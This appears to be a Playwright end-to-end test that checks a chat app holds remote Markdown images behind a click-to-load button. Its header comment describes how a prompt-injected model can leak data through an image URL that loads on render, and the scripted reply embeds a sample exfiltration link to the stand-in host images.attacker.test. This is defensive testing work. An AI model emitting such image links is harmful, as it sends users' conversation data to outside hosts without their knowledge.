/**
 * A Markdown image from another site does not load by itself: the browser
 * would fetch it on render, which sends whatever a prompt-injected model put
 * in the URL out of the viewer's browser with no click. The reply here
 * carries one remote image and one from the app's own origin; the remote one is a button
 * until it is pressed, and no request leaves for its host before then.
 */

import { randomUUID } from 'node:crypto';
import { test, expect } from './fixtures';
import { addStubModel, removeModel, scripted } from './support/stub-model';
import { createChat, send } from './support/chat';

test.use({ roles: ['renkei-user', 'renkei-operator'] });

const REMOTE_HOST = 'images.attacker.test';
// A one-pixel PNG.
const INLINE_PNG =
  'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==';

test('a remote Markdown image waits for a click; a same-origin one loads', async ({
  page,
  person: _person,
}, testInfo) => {
  const tag = `${testInfo.project.name}-${randomUUID().slice(0, 6)}`;
  const modelId = await addStubModel(page.request, tag, { label: `E2E model ${tag}` });
  const requested: string[] = [];
  await page.route(`**://${REMOTE_HOST}/**`, async (route) => {
    requested.push(route.request().url());
    await route.fulfill({
      status: 200,
      contentType: 'image/png',
      body: Buffer.from(INLINE_PNG.split(',')[1], 'base64'),
    });
  });
  // A path on the app's own origin: the other kind of image that loads unasked.
  await page.route('**/e2e-dot.png', (route) =>
    route.fulfill({
      status: 200,
      contentType: 'image/png',
      body: Buffer.from(INLINE_PNG.split(',')[1], 'base64'),
    })
  );
  try {
    const chatId = await createChat(page.request, { llmModelId: modelId, title: `Images ${tag}` });
    await send(
      page.request,
      chatId,
      scripted('Show me the chart.', [
        {
          text: [
            'Here you go:',
            '',
            `![the leak](https://${REMOTE_HOST}/p.png?d=previous-tool-result)`,
            '',
            '![inline dot](/e2e-dot.png)',
          ].join('\n'),
        },
      ]),
      modelId
    );

    await page.goto(`/chat/${chatId}`);
    const main = page.getByRole('main');
    const load = main.getByRole('button', { name: `Load image from ${REMOTE_HOST}` });
    await expect(load).toBeVisible();
    await expect(main.getByRole('img', { name: 'inline dot' })).toBeVisible();
    // Nothing went to the remote host while the button was showing.
    expect(requested).toEqual([]);
    await expect(main.getByRole('img', { name: 'the leak' })).toHaveCount(0);

    await load.click();
    await expect(main.getByRole('img', { name: 'the leak' })).toBeVisible();
    expect(requested).toHaveLength(1);
    await expect(load).toBeHidden();

    // Phone width: the held image is a button, never a horizontal scroll.
    await page.setViewportSize({ width: 390, height: 844 });
    const overflow = await page.evaluate(
      () => document.documentElement.scrollWidth - document.documentElement.clientWidth
    );
    expect(overflow).toBeLessThanOrEqual(0);
  } finally {
    await removeModel(page.request, modelId);
  }
});
